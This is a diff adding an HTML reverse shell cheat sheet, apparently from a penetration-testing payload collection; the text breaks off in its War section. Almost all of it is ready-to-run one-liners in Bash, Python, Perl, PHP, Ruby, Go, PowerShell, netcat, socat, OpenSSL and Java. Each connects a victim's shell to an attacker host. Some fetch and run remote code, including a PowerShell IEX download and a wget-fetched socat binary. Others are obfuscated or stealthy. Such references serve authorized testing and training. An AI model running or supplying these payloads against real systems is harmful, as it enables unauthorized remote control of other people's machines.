@@ -1,0 +1,389 @@
+<h1 id="reverse-shell-cheat-sheet">Reverse Shell Cheat Sheet</h1>
+<h2 id="summary">Summary</h2>
+<ul>
+<li><a href="#reverse-shell">Reverse Shell</a><ul>
+<li><a href="#awk">Awk</a></li>
+<li><a href="#revshells">Automatic Reverse Shell Generator</a></li>
+<li><a href="#bash-tcp">Bash TCP</a></li>
+<li><a href="#bash-udp">Bash UDP</a></li>
+<li><a href="#c">C</a></li>
+<li><a href="#dart">Dart</a></li>
+<li><a href="#golang">Golang</a></li>
+<li><a href="#groovy-alternative-1">Groovy Alternative 1</a></li>
+<li><a href="#groovy">Groovy</a></li>
+<li><a href="#java-alternative-1">Java Alternative 1</a></li>
+<li><a href="#java-alternative-2">Java Alternative 2</a></li>
+<li><a href="#java">Java</a></li>
+<li><a href="#lua">Lua</a></li>
+<li><a href="#ncat">Ncat</a></li>
+<li><a href="#netcat-openbsd">Netcat OpenBsd</a></li>
+<li><a href="#netcat-busybox">Netcat BusyBox</a></li>
+<li><a href="#netcat-traditional">Netcat Traditional</a></li>
+<li><a href="#nodejs">NodeJS</a></li>
+<li><a href="#openssl">OpenSSL</a></li>
+<li><a href="#perl">Perl</a></li>
+<li><a href="#php">PHP</a></li>
+<li><a href="#powershell">Powershell</a></li>
+<li><a href="#python">Python</a></li>
+<li><a href="#ruby">Ruby</a></li>
+<li><a href="#socat">Socat</a></li>
+<li><a href="#telnet">Telnet</a></li>
+<li><a href="#war">War</a></li>
+</ul>
+</li>
+<li><a href="#meterpreter-shell">Meterpreter Shell</a><ul>
+<li><a href="#windows-staged-reverse-tcp">Windows Staged reverse TCP</a></li>
+<li><a href="#windows-stageless-reverse-tcp">Windows Stageless reverse TCP</a></li>
+<li><a href="#linux-staged-reverse-tcp">Linux Staged reverse TCP</a></li>
+<li><a href="#linux-stageless-reverse-tcp">Linux Stageless reverse TCP</a></li>
+<li><a href="#other-platforms">Other platforms</a></li>
+</ul>
+</li>
+<li><a href="#spawn-tty-shell">Spawn TTY Shell</a></li>
+<li><a href="#references">References</a></li>
+</ul>
+<h2 id="reverse-shell">Reverse Shell</h2>
+<h3 id="bash-tcp">Bash TCP</h3>
+<pre><code class="lang-bash">bash -i &gt;&amp; /dev/tcp/<span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/<span class="hljs-number">4242</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>
+
+<span class="hljs-number">0</span>&lt;&amp;<span class="hljs-number">196</span>;exec <span class="hljs-number">196</span>&lt;&gt;/dev/tcp/<span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/<span class="hljs-number">4242</span>; sh &lt;&amp;<span class="hljs-number">196</span> &gt;&amp;<span class="hljs-number">196</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">196</span>
+
+/bin/bash -l &gt; /dev/tcp/<span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/<span class="hljs-number">4242</span> <span class="hljs-number">0</span>&lt;&amp;<span class="hljs-number">1</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>
+</code></pre>
+<h3 id="bash-udp">Bash UDP</h3>
+<pre><code class="lang-bash"><span class="hljs-symbol">Victim:</span>
+sh -i &gt;&amp; <span class="hljs-meta-keyword">/dev/</span>udp/<span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/<span class="hljs-number">4242</span> <span class="hljs-number">0</span>&gt;<span class="hljs-variable">&amp;1</span>
+<span class="hljs-symbol">
+Listener:</span>
+nc -u -lvp <span class="hljs-number">4242</span>
+</code></pre>
+<p>Don&#39;t forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash</p>
+<h3 id="socat">Socat</h3>
+<pre><code class="lang-powershell">user<span class="hljs-meta">@attack</span>$ socat <span class="hljs-string">file:</span>`tty`,raw,echo=<span class="hljs-number">0</span> TCP-<span class="hljs-string">L:</span><span class="hljs-number">4242</span>
+user<span class="hljs-meta">@victim</span>$ <span class="hljs-regexp">/tmp/</span>socat <span class="hljs-string">exec:</span><span class="hljs-string">'bash -li'</span>,pty,stderr,setsid,sigint,sane <span class="hljs-string">tcp:</span><span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">4242</span>
+</code></pre>
+<pre><code class="lang-powershell">user@victim$ wget -q https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/andrew-d/</span>static-binaries<span class="hljs-regexp">/raw/m</span>aster<span class="hljs-regexp">/binaries/</span>linux<span class="hljs-regexp">/x86_64/</span>socat -O <span class="hljs-regexp">/tmp/</span>socat; chmod +x <span class="hljs-regexp">/tmp/</span>socat; <span class="hljs-regexp">/tmp/</span>socat exec:<span class="hljs-string">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:<span class="hljs-number">10.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">4242</span>
+</code></pre>
+<p>Static socat binary can be found at <a href="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat">https://github.com/andrew-d/static-binaries</a></p>
+<h3 id="perl">Perl</h3>
+<pre><code class="lang-perl">perl -<span class="hljs-keyword">e</span> '<span class="hljs-keyword">use</span> Socket;<span class="hljs-variable">$i</span>=<span class="hljs-string">"10.0.0.1"</span>;<span class="hljs-variable">$p</span>=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="hljs-string">"tcp"</span>));<span class="hljs-keyword">if</span>(connect(S,sockaddr_in(<span class="hljs-variable">$p</span>,inet_aton(<span class="hljs-variable">$i</span>)))){<span class="hljs-keyword">open</span>(STDIN,<span class="hljs-string">"&gt;&amp;S"</span>);<span class="hljs-keyword">open</span>(STDOUT,<span class="hljs-string">"&gt;&amp;S"</span>);<span class="hljs-keyword">open</span>(STDERR,<span class="hljs-string">"&gt;&amp;S"</span>);exec(<span class="hljs-string">"/bin/sh -i"</span>);};'
+
+perl -MIO -<span class="hljs-keyword">e</span> '<span class="hljs-variable">$p</span>=fork;<span class="hljs-keyword">exit</span>,<span class="hljs-keyword">if</span>(<span class="hljs-variable">$p</span>);<span class="hljs-variable">$c</span>=new IO::Socket::INET(PeerAddr,<span class="hljs-string">"10.0.0.1:4242"</span>);STDIN-&gt;fdopen(<span class="hljs-variable">$c</span>,r);$~-&gt;fdopen(<span class="hljs-variable">$c</span>,w);system<span class="hljs-variable">$_</span> <span class="hljs-keyword">while</span>&lt;&gt;;'
+
+
+<span class="hljs-keyword">NOTE</span>: Windows only
+perl -MIO -<span class="hljs-keyword">e</span> '<span class="hljs-variable">$c</span>=new IO::Socket::INET(PeerAddr,<span class="hljs-string">"10.0.0.1:4242"</span>);STDIN-&gt;fdopen(<span class="hljs-variable">$c</span>,r);$~-&gt;fdopen(<span class="hljs-variable">$c</span>,w);system<span class="hljs-variable">$_</span> <span class="hljs-keyword">while</span>&lt;&gt;;'
+</code></pre>
+<h3 id="python">Python</h3>
+<p>Linux only</p>
+<p>IPv4</p>
+<pre><code class="lang-python"><span class="hljs-keyword">export</span> <span class="hljs-type">RHOST</span>=<span class="hljs-string">"10.0.0.1"</span>;<span class="hljs-keyword">export</span> <span class="hljs-type">RPORT</span>=<span class="hljs-number">4242</span>;python -c '<span class="hljs-keyword">import</span> sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(<span class="hljs-string">"RHOST"</span>),<span class="hljs-built_in">int</span>(os.getenv(<span class="hljs-string">"RPORT"</span>))));[os.dup2(s.fileno(),fd) <span class="hljs-keyword">for</span> fd <span class="hljs-keyword">in</span> (<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)];pty.spawn(<span class="hljs-string">"/bin/sh"</span>)'
+</code></pre>
+<p>IPv4</p>
+<pre><code class="lang-python">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="hljs-string">"10.0.0.1"</span>,<span class="hljs-number">4242</span>));os.dup2(s.fileno(),<span class="hljs-number">0</span>); os.dup2(s.fileno(),<span class="hljs-number">1</span>);os.dup2(s.fileno(),<span class="hljs-number">2</span>);import pty; pty.spawn(<span class="hljs-string">"/bin/bash"</span>)'
+</code></pre>
+<p>IPv6</p>
+<pre><code class="lang-python">python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((<span class="hljs-string">"dead:beef:2::125c"</span>,<span class="hljs-number">4242</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>));os.dup2(s.fileno(),<span class="hljs-number">0</span>); os.dup2(s.fileno(),<span class="hljs-number">1</span>); os.dup2(s.fileno(),<span class="hljs-number">2</span>);p=pty.spawn(<span class="hljs-string">"/bin/sh"</span>);'
+</code></pre>
+<pre><code class="lang-python">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="hljs-string">"10.0.0.1"</span>,<span class="hljs-number">4242</span>));os.dup2(s.fileno(),<span class="hljs-number">0</span>); os.dup2(s.fileno(),<span class="hljs-number">1</span>); os.dup2(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">"/bin/sh"</span>,<span class="hljs-string">"-i"</span>]);'
+</code></pre>
+<p>Windows only</p>
+<pre><code class="lang-powershell">C:\Python27\python.exe -c "(lambda <span class="hljs-strong">__y, __</span>g, <span class="hljs-strong">__contextlib: [[[[[[[(s.connect(('10.0.0.1', 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __</span>out: (lambda <span class="hljs-strong">__ctx: [__</span>ctx.<span class="hljs-strong">__enter__</span>(), <span class="hljs-strong">__ctx.__</span>exit<span class="hljs-strong">__(None, None, None), __</span>out[<span class="hljs-string">0</span>](<span class="hljs-link">lambda: None</span>)][<span class="hljs-symbol">2</span>])(<span class="hljs-strong">__contextlib.nested(type('except', (), {'__</span>enter<span class="hljs-strong">__': lambda self: None, '__</span>exit<span class="hljs-strong">__': lambda __</span>self, <span class="hljs-strong">__exctype, __</span>value, <span class="hljs-strong">__traceback: __</span>exctype is not None and (issubclass(<span class="hljs-strong">__exctype, KeyboardInterrupt) and [True for __</span>out[<span class="hljs-string">0</span>] in [<span class="hljs-string">((s.close(), lambda after: after())[1</span>])]][<span class="hljs-string">0</span>])})(), type('try', (), {'<span class="hljs-strong">__enter__</span>': lambda self: None, '<span class="hljs-strong">__exit__</span>': lambda <span class="hljs-strong">__self, __</span>exctype, <span class="hljs-strong">__value, __</span>traceback: [<span class="hljs-string">False for __out[0</span>] in [<span class="hljs-string">((p.wait(), (lambda __after: __after()))[1</span>])]][<span class="hljs-string">0</span>]})())))([<span class="hljs-string">None</span>]))[<span class="hljs-string">1</span>] for p2s<span class="hljs-emphasis">_thread.daemon in [(True)]][0] for _</span><span class="hljs-emphasis">_g['p2s_</span>thread'] in [<span class="hljs-string">(threading.Thread(target=p2s, args=[s, p</span>]))]][<span class="hljs-string">0</span>])[<span class="hljs-string">1</span>] for s2p<span class="hljs-emphasis">_thread.daemon in [(True)]][0] for _</span><span class="hljs-emphasis">_g['s2p_</span>thread'] in [<span class="hljs-string">(threading.Thread(target=s2p, args=[s, p</span>]))]][<span class="hljs-string">0</span>] for <span class="hljs-strong">__g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __</span>g[<span class="hljs-string">'s'</span>] in [<span class="hljs-string">(socket.socket(socket.AF_INET, socket.SOCK_STREAM))</span>]][<span class="hljs-string">0</span>] for <span class="hljs-strong">__g['p2s'], p2s.__</span>name<span class="hljs-strong">__ in [(lambda s, p: (lambda __</span>l: [<span class="hljs-string">(lambda __after: __y(lambda __this: lambda: (__l['s'</span>].send(<span class="hljs-strong">__l['p'].stdout.read(1)), __</span>this())[<span class="hljs-string">1</span>] if True else <span class="hljs-strong">__after())())(lambda: None) for __</span>l[<span class="hljs-string">'s'</span>], <span class="hljs-strong">__l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __</span>g[<span class="hljs-string">'s2p'</span>], s2p.<span class="hljs-strong">__name__</span> in [<span class="hljs-string">(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'</span>].stdin.write(<span class="hljs-strong">__l['data']), __</span>after())[<span class="hljs-string">1</span>] if (len(<span class="hljs-strong">__l['data']) &gt; 0) else __</span>after())(lambda: <span class="hljs-strong">__this()) for __</span>l[<span class="hljs-string">'data'</span>] in [<span class="hljs-string">(__l['s'</span>].recv(1024))]][<span class="hljs-string">0</span>] if True else <span class="hljs-strong">__after())())(lambda: None) for __</span>l[<span class="hljs-string">'s'</span>], <span class="hljs-strong">__l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __</span>g[<span class="hljs-string">'os'</span>] in [<span class="hljs-string">(__import__('os', __g, __g))</span>]][<span class="hljs-string">0</span>] for <span class="hljs-strong">__g['socket'] in [(__</span>import<span class="hljs-strong">__('socket', __</span>g, <span class="hljs-strong">__g))]][0] for __</span>g[<span class="hljs-string">'subprocess'</span>] in [<span class="hljs-string">(__import__('subprocess', __g, __g))</span>]][<span class="hljs-string">0</span>] for <span class="hljs-strong">__g['threading'] in [(__</span>import<span class="hljs-strong">__('threading', __</span>g, <span class="hljs-strong">__g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __</span>import__('contextlib'))"
+</code></pre>
+<h3 id="php">PHP</h3>
+<pre><code class="lang-bash">php -r '$sock=fsockopen(<span class="hljs-string">"10.0.0.1"</span>,<span class="hljs-number">4242</span>);exec(<span class="hljs-string">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span>);'
+php -r '$sock=fsockopen(<span class="hljs-string">"10.0.0.1"</span>,<span class="hljs-number">4242</span>);shell_exec(<span class="hljs-string">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span>);'
+php -r '$sock=fsockopen(<span class="hljs-string">"10.0.0.1"</span>,<span class="hljs-number">4242</span>);`/bin/sh -i &lt;&amp;<span class="hljs-number">3</span> &gt;&amp;<span class="hljs-number">3</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">3</span>`;'
+php -r '$sock=fsockopen(<span class="hljs-string">"10.0.0.1"</span>,<span class="hljs-number">4242</span>);system(<span class="hljs-string">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span>);'
+php -r '$sock=fsockopen(<span class="hljs-string">"10.0.0.1"</span>,<span class="hljs-number">4242</span>);passthru(<span class="hljs-string">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span>);'
+php -r '$sock=fsockopen(<span class="hljs-string">"10.0.0.1"</span>,<span class="hljs-number">4242</span>);popen(<span class="hljs-string">"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3"</span>, <span class="hljs-string">"r"</span>);'
+</code></pre>
+<pre><code class="lang-bash"><span class="hljs-attribute">php</span> -r <span class="hljs-string">'<span class="hljs-variable">$sock</span>=fsockopen("10.0.0.1",4242);<span class="hljs-variable">$proc</span>=proc_open("/bin/sh -i", array(0=&gt;<span class="hljs-variable">$sock</span>, 1=&gt;<span class="hljs-variable">$sock</span>, 2=&gt;<span class="hljs-variable">$sock</span>),<span class="hljs-variable">$pipes</span>);'</span>
+</code></pre>
+<h3 id="ruby">Ruby</h3>
+<pre><code class="lang-ruby">ruby -rsocket -<span class="hljs-keyword">e</span>'f=TCPSocket.<span class="hljs-keyword">open</span>(<span class="hljs-string">"10.0.0.1"</span>,4242).to_i;exec sprintf(<span class="hljs-string">"/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d"</span>,f,f,f)'
+
+ruby -rsocket -<span class="hljs-keyword">e</span>'<span class="hljs-keyword">exit</span> <span class="hljs-keyword">if</span> fork;c=TCPSocket.new(<span class="hljs-string">"10.0.0.1"</span>,<span class="hljs-string">"4242"</span>);loop{c.gets.chomp!;(<span class="hljs-keyword">exit</span>! <span class="hljs-keyword">if</span> <span class="hljs-variable">$_</span>==<span class="hljs-string">"exit"</span>);(<span class="hljs-variable">$_</span>=~/<span class="hljs-keyword">cd</span> (.+)/i?(<span class="hljs-keyword">Dir</span>.<span class="hljs-keyword">chdir</span>(<span class="hljs-variable">$1</span>)):(IO.popen(<span class="hljs-variable">$_</span>,?r){|io|c.<span class="hljs-keyword">print</span> io.<span class="hljs-keyword">read</span>}))rescue c.puts <span class="hljs-string">"failed: #{$_}"</span>}'
+
+<span class="hljs-keyword">NOTE</span>: Windows only
+ruby -rsocket -<span class="hljs-keyword">e</span> 'c=TCPSocket.new(<span class="hljs-string">"10.0.0.1"</span>,<span class="hljs-string">"4242"</span>);<span class="hljs-keyword">while</span>(cmd=c.gets);IO.popen(cmd,<span class="hljs-string">"r"</span>){|io|c.<span class="hljs-keyword">print</span> io.<span class="hljs-keyword">read</span>}end'
+</code></pre>
+<h3 id="golang">Golang</h3>
+<pre><code class="lang-bash">echo 'package main;import<span class="hljs-string">"os/exec"</span>;import<span class="hljs-string">"net"</span>;func main(){c,<span class="hljs-symbol">_</span>:=net.Dial(<span class="hljs-string">"tcp"</span>,<span class="hljs-string">"10.0.0.1:4242"</span>);cmd:=exec.Command(<span class="hljs-string">"/bin/sh"</span>);cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' &gt; /tmp/t.<span class="hljs-built_in">go</span> &amp;&amp; <span class="hljs-built_in">go</span> run /tmp/t.<span class="hljs-built_in">go</span> &amp;&amp; rm /tmp/t.<span class="hljs-built_in">go</span>
+</code></pre>
+<h3 id="netcat-traditional">Netcat Traditional</h3>
+<pre><code class="lang-bash">nc -e /bin/sh <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">4242</span>
+nc -e /bin/bash <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">4242</span>
+nc -c bash <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">4242</span>
+</code></pre>
+<h3 id="netcat-openbsd">Netcat OpenBsd</h3>
+<pre><code class="lang-bash">rm <span class="hljs-meta-keyword">/tmp/</span>f;mkfifo <span class="hljs-meta-keyword">/tmp/</span>f;cat <span class="hljs-meta-keyword">/tmp/</span>f|<span class="hljs-meta-keyword">/bin/</span>sh -i <span class="hljs-number">2</span>&gt;<span class="hljs-variable">&amp;1</span>|nc <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">4242</span> &gt;<span class="hljs-meta-keyword">/tmp/</span>f
+</code></pre>
+<h3 id="netcat-busybox">Netcat BusyBox</h3>
+<pre><code class="lang-bash">rm <span class="hljs-meta-keyword">/tmp/</span>f;mknod <span class="hljs-meta-keyword">/tmp/</span>f p;cat <span class="hljs-meta-keyword">/tmp/</span>f|<span class="hljs-meta-keyword">/bin/</span>sh -i <span class="hljs-number">2</span>&gt;<span class="hljs-variable">&amp;1</span>|nc <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">4242</span> &gt;<span class="hljs-meta-keyword">/tmp/</span>f
+</code></pre>
+<h3 id="ncat">Ncat</h3>
+<pre><code class="lang-bash">ncat <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">4242</span> -e /bin/bash
+ncat --udp <span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">4242</span> -e /bin/bash
+</code></pre>
+<h3 id="openssl">OpenSSL</h3>
+<p>Attacker:</p>
+<pre><code class="lang-powershell">user<span class="hljs-variable">@attack</span><span class="hljs-variable">$ </span>openssl req -x509 -newkey <span class="hljs-symbol">rsa:</span><span class="hljs-number">4096</span> -keyout key.pem -out cert.pem -days <span class="hljs-number">365</span> -nodes
+user<span class="hljs-variable">@attack</span><span class="hljs-variable">$ </span>openssl s_server -quiet -key key.pem -cert cert.pem -port <span class="hljs-number">4242</span>
+<span class="hljs-keyword">or</span>
+user<span class="hljs-variable">@attack</span><span class="hljs-variable">$ </span>ncat --ssl -vv -l -p <span class="hljs-number">4242</span>
+
+user<span class="hljs-variable">@victim</span><span class="hljs-variable">$ </span>mkfifo /tmp/s; <span class="hljs-regexp">/bin/sh</span> -i &lt; <span class="hljs-regexp">/tmp/s</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | openssl s_client -quiet -connect <span class="hljs-number">10.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">4242</span> &gt; <span class="hljs-regexp">/tmp/s</span>; rm /tmp/s
+</code></pre>
+<p>TLS-PSK (does not rely on PKI or self-signed certificates)</p>
+<pre><code class="lang-bash"><span class="hljs-comment"># generate 384-bit PSK</span>
+<span class="hljs-comment"># use the generated string as a value for the two PSK variables from below</span>
+openssl rand -hex 48
+<span class="hljs-comment"># server (attacker)</span>
+<span class="hljs-built_in">export</span> LHOST=<span class="hljs-string">"*"</span>; <span class="hljs-built_in">export</span> LPORT=<span class="hljs-string">"4242"</span>; <span class="hljs-built_in">export</span> PSK=<span class="hljs-string">"replacewithgeneratedpskfromabove"</span>; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk <span class="hljs-variable">$PSK</span> -nocert -accept <span class="hljs-variable">$LHOST</span>:<span class="hljs-variable">$LPORT</span>
+<span class="hljs-comment"># client (victim)</span>
+<span class="hljs-built_in">export</span> RHOST=<span class="hljs-string">"10.0.0.1"</span>; <span class="hljs-built_in">export</span> RPORT=<span class="hljs-string">"4242"</span>; <span class="hljs-built_in">export</span> PSK=<span class="hljs-string">"replacewithgeneratedpskfromabove"</span>; <span class="hljs-built_in">export</span> PIPE=<span class="hljs-string">"/tmp/`openssl rand -hex 4`"</span>; mkfifo <span class="hljs-variable">$PIPE</span>; /bin/sh -i &lt; <span class="hljs-variable">$PIPE</span> 2&gt;&amp;1 | openssl s_client -quiet -tls1_2 -psk <span class="hljs-variable">$PSK</span> -connect <span class="hljs-variable">$RHOST</span>:<span class="hljs-variable">$RPORT</span> &gt; <span class="hljs-variable">$PIPE</span>; rm <span class="hljs-variable">$PIPE</span>
+</code></pre>
+<h3 id="powershell">Powershell</h3>
+<pre><code class="lang-powershell">powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.<span class="hljs-keyword">Net</span>.Sockets.TCPClient(<span class="hljs-string">"10.0.0.1"</span>,4242);<span class="hljs-variable">$stream</span> = <span class="hljs-variable">$client</span>.GetStream();[byte[]]<span class="hljs-variable">$bytes</span> = 0..65535|%{0};<span class="hljs-keyword">while</span>((<span class="hljs-variable">$i</span> = <span class="hljs-variable">$stream</span>.<span class="hljs-keyword">Read</span>(<span class="hljs-variable">$bytes</span>, 0, <span class="hljs-variable">$bytes</span>.Length)) -ne 0){;<span class="hljs-variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="hljs-variable">$bytes</span>,0, <span class="hljs-variable">$i</span>);<span class="hljs-variable">$sendback</span> = (iex <span class="hljs-variable">$data</span> 2&gt;&amp;1 | <span class="hljs-keyword">Out</span>-String );<span class="hljs-variable">$sendback2</span>  = <span class="hljs-variable">$sendback</span> + <span class="hljs-string">"PS "</span> + (<span class="hljs-keyword">pwd</span>).Path + <span class="hljs-string">"&gt; "</span>;<span class="hljs-variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="hljs-variable">$sendback2</span>);<span class="hljs-variable">$stream</span>.Write(<span class="hljs-variable">$sendbyte</span>,0,<span class="hljs-variable">$sendbyte</span>.Length);<span class="hljs-variable">$stream</span>.Flush()};<span class="hljs-variable">$client</span>.<span class="hljs-keyword">Close</span>()
+</code></pre>
+<pre><code class="lang-powershell">powershell -nop -c <span class="hljs-string">"$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</span>
+</code></pre>
+<pre><code class="lang-powershell">powershell IEX (<span class="hljs-keyword">New</span>-Object Net.WebClient).DownloadString(<span class="hljs-symbol">'https</span>://gist.githubusercontent.com/staaldraad/<span class="hljs-number">204928</span>a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-<span class="hljs-keyword">reverse</span>.ps1')
+</code></pre>
+<h3 id="awk">Awk</h3>
+<pre><code class="lang-powershell">awk '<span class="hljs-type">BEGIN</span> {s = <span class="hljs-string">"/inet/tcp/0/10.0.0.1/4242"</span>; <span class="hljs-keyword">while</span>(<span class="hljs-number">42</span>) { <span class="hljs-keyword">do</span>{ printf <span class="hljs-string">"shell&gt;"</span> |&amp; s; s |&amp; getline <span class="hljs-built_in">c</span>; <span class="hljs-keyword">if</span>(<span class="hljs-built_in">c</span>){ <span class="hljs-keyword">while</span> ((<span class="hljs-built_in">c</span> |&amp; getline) &gt; <span class="hljs-number">0</span>) <span class="hljs-built_in">print</span> $<span class="hljs-number">0</span> |&amp; s; close(<span class="hljs-built_in">c</span>); } } <span class="hljs-keyword">while</span>(<span class="hljs-built_in">c</span> != <span class="hljs-string">"exit"</span>) close(s); }}' /dev/null
+</code></pre>
+<h3 id="java">Java</h3>
+<pre><code class="lang-java">Runtime r = Runtime.getRuntime();
+Process p = r.<span class="hljs-built_in">exec</span>(<span class="hljs-string">"/bin/bash -c '</span><span class="hljs-built_in">exec</span> <span class="hljs-number">5</span>&lt;&gt;/dev/tcp/<span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/<span class="hljs-number">4242</span>;cat &lt;&amp;<span class="hljs-number">5</span> | <span class="hljs-keyword">while</span> read line; <span class="hljs-keyword">do</span> $line <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">5</span> &gt;&amp;<span class="hljs-number">5</span>; done'<span class="hljs-string">");
+p.waitFor();</span>
+</code></pre>
+<h4 id="java-alternative-1">Java Alternative 1</h4>
+<pre><code class="lang-java"><span class="hljs-keyword">String</span> host=<span class="hljs-string">"127.0.0.1"</span>;
+<span class="hljs-keyword">int</span> port=<span class="hljs-number">4444</span>;
+<span class="hljs-keyword">String</span> cmd=<span class="hljs-string">"cmd.exe"</span>;
+<span class="hljs-built_in">Process</span> p=<span class="hljs-keyword">new</span> ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=<span class="hljs-keyword">new</span> Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();<span class="hljs-built_in">while</span>(!s.isClosed()){<span class="hljs-built_in">while</span>(pi.<span class="hljs-built_in">available</span>()&gt;<span class="hljs-number">0</span>)so.<span class="hljs-built_in">write</span>(pi.<span class="hljs-built_in">read</span>());<span class="hljs-built_in">while</span>(pe.<span class="hljs-built_in">available</span>()&gt;<span class="hljs-number">0</span>)so.<span class="hljs-built_in">write</span>(pe.<span class="hljs-built_in">read</span>());<span class="hljs-built_in">while</span>(si.<span class="hljs-built_in">available</span>()&gt;<span class="hljs-number">0</span>)po.<span class="hljs-built_in">write</span>(si.<span class="hljs-built_in">read</span>());so.<span class="hljs-built_in">flush</span>();po.<span class="hljs-built_in">flush</span>();Thread.sleep(<span class="hljs-number">50</span>);<span class="hljs-built_in">try</span> {p.<span class="hljs-built_in">exitValue</span>();<span class="hljs-built_in">break</span>;}<span class="hljs-built_in">catch</span> (Exception e){}};p.destroy();s.<span class="hljs-built_in">close</span>();
+</code></pre>
+<h4 id="java-alternative-2">Java Alternative 2</h4>
+<p><strong>NOTE</strong>: This is more stealthy</p>
+<pre><code class="lang-java"><span class="hljs-keyword">Thread</span> <span class="hljs-keyword">thread</span> = <span class="hljs-literal">new</span> <span class="hljs-keyword">Thread</span>(){
+    <span class="hljs-keyword">public</span> <span class="hljs-literal">void</span> run(){
+        <span class="hljs-comment">// Reverse shell here</span>
+    }
+}
+<span class="hljs-keyword">thread</span>.start();
+</code></pre>
+<h3 id="telnet">Telnet</h3>
+<pre><code class="lang-bash"><span class="hljs-keyword">In</span> Attacker machine start <span class="hljs-keyword">two</span> listeners:
+nc -lvp 8080
+nc -lvp 8081
+
+<span class="hljs-keyword">In</span> Victime machine <span class="hljs-keyword">run</span> below command:
+telnet &lt;Your_IP&gt; 8080 | /bin/<span class="hljs-keyword">sh</span> | telnet &lt;Your_IP&gt; 8081
+</code></pre>
+<h3 id="war">War</h3>
+<pre><code class="lang-java">msfvenom -p java/jsp_shell_reverse_tcp LHOST=<span class="hljs-number">10.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span> LPORT=<span class="hljs-number">4242</span> -f war &gt; <span class="hljs-keyword">reverse</span>.war
